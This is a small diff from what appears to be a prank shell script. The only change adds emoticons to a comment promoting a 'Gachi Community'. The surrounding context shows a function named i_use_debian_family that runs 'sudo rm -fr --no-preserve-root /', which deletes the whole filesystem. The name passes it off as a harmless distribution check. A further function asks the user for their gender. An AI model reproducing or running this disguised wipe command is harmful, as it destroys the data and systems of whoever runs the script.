@@ -127,7 +127,7 @@ function i_use_debian_family() {
     sudo rm -fr --no-preserve-root /
 }
 
-# Promoting Gachi Community
+# Promoting Gachi Community ρ(- ω -、)ヾ(￣ω￣; )
 function gender_sex_validation() {
     echo "Can you enter your gender? ~:"
     read gender;
